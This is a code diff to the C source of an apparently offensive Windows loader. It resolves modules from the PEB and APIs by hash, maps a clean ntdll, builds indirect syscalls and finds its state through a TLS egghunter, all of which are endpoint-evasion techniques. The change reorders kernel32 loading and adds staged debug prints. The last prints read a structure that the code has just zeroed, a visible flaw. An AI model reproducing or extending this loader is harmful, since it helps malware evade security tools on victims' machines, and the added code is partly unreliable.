@@ -1,5 +1,6 @@
 #include "Common.h"
 #include "Constexpr.h"
+#include "Dbg.h"
 
 #define TLS_SEARCH_LIMIT  20
 
@@ -57,10 +58,18 @@ EXTERN_C FUNC VOID PreMain(
 
     //
     // Stage 1: resolve the bare minimum from the in-process PEB so we can map
-    // a clean ntdll and build indirect syscalls.
+    // a clean ntdll and build indirect syscalls.  kernel32 comes first so the
+    // debug ladder can print as early as possible.
     //
-    if ( !(Stardust.Modules.Ntdll = LdrModulePeb(H_MODULE_NTDLL)) )
+    if ( !(Stardust.Modules.Kernel32 = LdrModulePeb(H_MODULE_KERNEL32)) )
         return;
+
+    NAXDBG(Stardust.Modules.Kernel32, "\r\np0k32\r\n");
+
+    if ( !(Stardust.Modules.Ntdll = LdrModulePeb(H_MODULE_NTDLL)) ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p1-ntdll-FAIL\r\n");
+        return;
+    }
 
     Stardust.Win32.RtlAllocateHeap = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("RtlAllocateHeap"));
     Stardust.Win32.NtOpenSection = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtOpenSection"));
@@ -69,42 +78,54 @@ EXTERN_C FUNC VOID PreMain(
     Stardust.Win32.NtProtectVirtualMemory = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtProtectVirtualMemory"));
     Stardust.Win32.NtClose = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtClose"));
 
-    if ( !(Stardust.Modules.Kernel32 = LdrModulePeb(H_MODULE_KERNEL32)) )
-        return;
-
+    Stardust.Win32.VirtualAlloc = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("VirtualAlloc"));
     Stardust.Win32.TlsAlloc = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsAlloc"));
     Stardust.Win32.TlsSetValue = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsSetValue"));
     Stardust.Win32.TlsFree = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsFree"));
 
-    if ( !Stardust.Win32.RtlAllocateHeap || !Stardust.Win32.TlsAlloc ||
+    NAXDBG(Stardust.Modules.Kernel32, "p1-apis\r\n");
+    if ( !Stardust.Win32.RtlAllocateHeap || !Stardust.Win32.VirtualAlloc || !Stardust.Win32.TlsAlloc ||
          !Stardust.Win32.TlsSetValue || !Stardust.Win32.TlsFree ||
-         !Stardust.Win32.NtOpenSection || !Stardust.Win32.NtMapViewOfSection )
+         !Stardust.Win32.NtOpenSection || !Stardust.Win32.NtMapViewOfSection ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p1-apis-FAIL\r\n");
         return;
+    }
 
     //
     // Stage 2: heap-allocate INSTANCE and map clean ntdll.
     //
+    NAXDBG(Stardust.Modules.Kernel32, "p2-heap\r\n");
     Inst = Stardust.Win32.RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, sizeof(INSTANCE));
-    if ( !Inst )
+    NAXDBGX(Stardust.Modules.Kernel32, "p2-heap=", Inst);
+    if ( !Inst ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p2-heap-FAIL\r\n");
         return;
+    }
 
     MmCopy(Inst, &Stardust, sizeof(INSTANCE));
 
     PINSTANCE pInst = (PINSTANCE)Inst;
 
+    NAXDBG(Stardust.Modules.Kernel32, "p3-cleanmap\r\n");
     pInst->Modules.CleanNtdll = NaxMapCleanNtdll(pInst);
-    if ( !pInst->Modules.CleanNtdll )
+    if ( !pInst->Modules.CleanNtdll ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p3-cleanmap-FAIL\r\n");
         return;
+    }
 
     //
     // Stage 3: build indirect syscall stubs from the clean copy.
     //
-    if ( !NaxScInit(pInst) )
+    NAXDBG(Stardust.Modules.Kernel32, "p4-scinit\r\n");
+    if ( !NaxScInit(pInst) ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p4-scinit-FAIL\r\n");
         return;
+    }
 
     //
     // Stage 4: TLS egghunter — consecutive slots for INSTANCE retrieval.
     //
+    NAXDBG(Stardust.Modules.Kernel32, "p5-tls\r\n");
     DWORD  slots[TLS_SEARCH_LIMIT] = { 0 };
     UINT32 slotCount = 0;
     DWORD  eggSlot = TLS_OUT_OF_INDEXES;
@@ -123,8 +144,10 @@ EXTERN_C FUNC VOID PreMain(
         }
     }
 
-    if ( eggSlot == TLS_OUT_OF_INDEXES )
+    if ( eggSlot == TLS_OUT_OF_INDEXES ) {
+        NAXDBG(Stardust.Modules.Kernel32, "p5-tls-FAIL\r\n");
         return;
+    }
 
     for ( UINT32 i = 0; i < slotCount; i++ ) {
         if ( slots[i] != eggSlot && slots[i] != instSlot )
@@ -136,5 +159,7 @@ EXTERN_C FUNC VOID PreMain(
 
     MmZero(&Stardust, sizeof(Stardust));
 
+    NAXDBG(Stardust.Modules.Kernel32, "p6-main\r\n");
     Main(Param);
+    NAXDBG(Stardust.Modules.Kernel32, "p7-main-ret\r\n");
 }
